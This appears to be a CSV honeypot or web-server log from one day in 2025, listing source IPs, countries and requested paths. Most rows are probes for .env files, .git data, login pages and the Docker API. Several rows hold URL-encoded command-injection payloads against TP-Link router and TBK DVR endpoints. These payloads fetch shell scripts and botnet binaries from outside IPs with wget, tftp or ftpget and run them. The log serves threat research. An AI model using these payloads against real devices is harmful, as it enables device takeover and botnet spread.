"2025-06-16","185.133.213.86","Myanmar","HTTP","/.env"
"2025-06-16","206.168.34.33","United States","HTTP","/favicon.ico"
"2025-06-16","206.168.34.33","United States","HTTP","/login"
"2025-06-16","206.168.34.33","United States","HTTP","/favicon.ico"
"2025-06-16","170.64.157.9","Australia","HTTP","/form.html"
"2025-06-16","170.64.157.9","Australia","HTTP","/t4"
"2025-06-16","170.64.157.9","Australia","HTTP","/geoip/"
"2025-06-16","170.64.157.9","Australia","HTTP","/favicon.ico"
"2025-06-16","170.64.157.9","Australia","HTTP","/password.php"
"2025-06-16","170.64.157.9","Australia","HTTP","/1.php"
"2025-06-16","170.64.157.9","Australia","HTTP","/systembc/password.php"
"2025-06-16","170.64.157.9","Australia","HTTP","/upl.php"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","124.221.33.192","China","HTTP","/containers/json"
"2025-06-16","124.221.33.192","China","HTTP","/containers/json"
"2025-06-16","124.221.33.192","China","HTTP","/.env.bak"
"2025-06-16","124.221.33.192","China","HTTP","/.env"
"2025-06-16","124.221.33.192","China","HTTP","/version"
"2025-06-16","45.135.194.34","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%29+%7C+sh+-s+tplink%3B)"
"2025-06-16","87.255.194.135","Kazakhstan","HTTP","/admin/assets/js/pbxlib.js"
"2025-06-16","70.39.90.205","United States","HTTP","/.env"
"2025-06-16","70.39.90.205","United States","HTTP","/.git/config"
"2025-06-16","118.194.251.37","Thailand","HTTP","/favicon.ico"
"2025-06-16","118.194.251.37","Thailand","HTTP","/robots.txt"
"2025-06-16","118.194.251.37","Thailand","HTTP","/sitemap.xml"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","144.172.116.95","United States","HTTP","/device.rsp?opt=sys\u0026cmd=___S_O_S_T_R_E_A_MAX___\u0026mdb=sos\u0026mdc=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F160.187.246.150%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fboatnet.arm7%20tbk"
"2025-06-16","87.121.84.179","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-06-16","87.121.84.179","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-06-16","20.163.15.207","United States","HTTP","/hudson"
"2025-06-16","65.49.1.129","United States","HTTP","http://api.ipify.org/?format=json"
"2025-06-16","65.49.1.129","United States","HTTP","/geoserver/web/"
"2025-06-16","104.167.221.114","United States","HTTP","/device.rsp?opt=sys\u0026cmd=___S_O_S_T_R_E_A_MAX___\u0026mdb=sos\u0026mdc=cd%20%2Ftmp%20%7C%7C%20cd%20%2Fvar%2Frun%20%7C%7C%20cd%20%2Fmnt%20%7C%7C%20cd%20%2Froot%20%7C%7C%20cd%20%2F%3B%20wget%20http%3A%2F%2F104.167.221.114%2Ftbkdvr.sh%3B%20chmod%20777%20tbkdvr.sh%3B%20sh%20tbkdvr.sh%3B%20tftp%20104.167.221.114%20-c%20get%20tbkdvr1.sh%3B%20chmod%20777%20tbkdvr1.sh%3B%20sh%20tbkdvr1.sh%3B%20tftp%20-r%20tbkdvr2.sh%20-g%20104.167.221.114%3B%20chmod%20777%20tbkdvr2.sh%3B%20sh%20tbkdvr2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%20104.167.221.114%20tbkdvr1.sh%20tbkdvr1.sh%3B%20sh%20tbkdvr1.sh%3B%20rm%20-rf%20tbkdvr.sh%20tbkdvr1.sh%20tbkdvr2.sh%20tbkdvr1.sh"
"2025-06-16","45.135.194.34","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%29+%7C+sh+-s+tplink%3B)"
"2025-06-16","176.65.148.250","The Netherlands","HTTP","/boaform/admin/formLogin"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","198.55.98.76","United States","HTTP","/.git/index"
"2025-06-16","104.234.115.169","Canada","HTTP","/favicon.ico"
"2025-06-16","104.234.115.169","Canada","HTTP","/manage/account/login"
"2025-06-16","104.234.115.169","Canada","HTTP","/admin/index.html"
"2025-06-16","104.234.115.169","Canada","HTTP","/index.html"
"2025-06-16","104.234.115.169","Canada","HTTP","/+CSCOE+/logon.html"
"2025-06-16","104.234.115.169","Canada","HTTP","/cgi-bin/login.cgi"
"2025-06-16","104.234.115.169","Canada","HTTP","/login.htm"
"2025-06-16","104.234.115.169","Canada","HTTP","/login.html"
"2025-06-16","104.234.115.169","Canada","HTTP","/login.jsp"
"2025-06-16","104.234.115.169","Canada","HTTP","/login"
"2025-06-16","104.234.115.169","Canada","HTTP","/doc/index.html"
"2025-06-16","104.234.115.169","Canada","HTTP","/remote/login"
"2025-06-16","104.234.115.169","Canada","HTTP","/web/"
"2025-06-16","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
